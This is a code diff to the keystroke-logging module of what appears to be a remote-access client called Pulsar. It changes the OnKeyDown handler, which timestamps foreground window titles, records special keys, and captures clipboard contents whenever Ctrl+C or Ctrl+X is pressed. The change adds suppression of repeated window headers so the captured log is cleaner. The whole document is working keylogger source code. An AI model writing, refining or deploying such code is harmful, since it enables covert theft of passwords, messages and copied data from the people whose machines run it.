@@ -30,6 +30,8 @@ namespace Pulsar.Client.Logging
         private readonly HashSet<Keys> _heldModifiers = new HashSet<Keys>();
         private readonly HashSet<Keys> _processedKeys = new HashSet<Keys>();
 
+        private string _lastHeaderLine = "";
+
         public bool IsDisposed { get; private set; }
 
         // Names of windows whose titles change constantly and should be generalized
@@ -92,65 +94,78 @@ namespace Pulsar.Client.Logging
             _events.KeyPress -= OnKeyPress;
         }
 
-        private void OnKeyDown(object sender, KeyEventArgs e)
+private void OnKeyDown(object sender, KeyEventArgs e)
+{
+    // Track window changes
+    string rawTitle = NativeMethodsHelper.GetForegroundWindowTitle() ?? "Unknown Window";
+
+    // Normalize dynamic titles
+    string win = NormalizeWindowTitle(rawTitle);
+
+    lock (_syncLock)
+    {
+        // -------- WINDOW CHANGE DETECTION --------
+        bool windowChanged = !string.Equals(win, _currentWindow, StringComparison.Ordinal);
+
+        if (windowChanged && DateTime.UtcNow - _lastWindowChange > _windowChangeThreshold)
         {
-            // Track window changes
-            string rawTitle = NativeMethodsHelper.GetForegroundWindowTitle() ?? "Unknown Window";
+            // New actual window → flush all buffered content
+            FlushLineBuffer();
 
-            // Normalize dynamic titles
-            string win = NormalizeWindowTitle(rawTitle);
+            _currentWindow = win;
+            _lastWindowChange = DateTime.UtcNow;
 
-            lock (_syncLock)
-            {
-                bool windowChanged = !string.Equals(win, _currentWindow, StringComparison.Ordinal);
-
-                if (windowChanged && DateTime.UtcNow - _lastWindowChange > _windowChangeThreshold)
-                {
-                    FlushLineBuffer();
-
-                    _currentWindow = win;
-                    _lastWindowChange = DateTime.UtcNow;
-
-                    _lineBuffer.AppendLine($"[{DateTime.Now:HH:mm:ss}] {rawTitle} ||");
-                    _lineBuffer.AppendLine();
-                }
-
-                // Only process special keys in KeyDown, skip printable characters
-                if (IsModifierKey(e.KeyCode))
-                {
-                    _heldModifiers.Add(e.KeyCode);
-                    return;
-                }
-
-                // Mark key as processed to avoid double handling
-                if (!_processedKeys.Contains(e.KeyCode))
-                {
-                    // ===== Clipboard logging on Ctrl+C / Ctrl+X =====
-                    if (IsCtrlHeld() && (e.KeyCode == Keys.C || e.KeyCode == Keys.X))
-                    {
-                        Thread t = new Thread(() =>
-                        {
-                            try
-                            {
-                                // Allow OS time to update clipboard AFTER Ctrl+C
-                                Thread.Sleep(5);
-
-                                TryLogClipboard();
-                            }
-                            catch { }
-                        });
-
-                        t.SetApartmentState(ApartmentState.STA); // <-- REQUIRED for clipboard APIs
-                        t.IsBackground = true;
-                        t.Start();
-                    }
-
-
-                    _processedKeys.Add(e.KeyCode);
-                    HandleSpecialKey(e.KeyCode);
-                }
-            }
+            // Reset stored header (forces new header line)
+            _lastHeaderLine = "";
         }
+
+        // -------- DUPLICATE WINDOW HEADER SUPPRESSION --------
+        string header = $"[{DateTime.Now:HH:mm:ss}] {rawTitle} ||";
+
+        if (_lastHeaderLine != header)
+        {
+            // Only write header when it's NOT a duplicate
+            _lineBuffer.AppendLine(header);
+            _lineBuffer.AppendLine();
+
+            _lastHeaderLine = header;
+        }
+        // else → same header again, do not repeat it
+
+
+        // -------- MODIFIER KEYS --------
+        if (IsModifierKey(e.KeyCode))
+        {
+            _heldModifiers.Add(e.KeyCode);
+            return;
+        }
+
+        // -------- SPECIAL KEYS & CLIPBOARD LOGGING --------
+        if (!_processedKeys.Contains(e.KeyCode))
+        {
+            // Clipboard logging on Ctrl+C / Ctrl+X
+            if (IsCtrlHeld() && (e.KeyCode == Keys.C || e.KeyCode == Keys.X))
+            {
+                Thread t = new Thread(() =>
+                {
+                    try
+                    {
+                        Thread.Sleep(5);
+                        TryLogClipboard();
+                    }
+                    catch { }
+                });
+
+                t.SetApartmentState(ApartmentState.STA);
+                t.IsBackground = true;
+                t.Start();
+            }
+
+            _processedKeys.Add(e.KeyCode);
+            HandleSpecialKey(e.KeyCode);
+        }
+    }
+}
 
         private void OnKeyPress(object sender, KeyPressEventArgs e)
         {
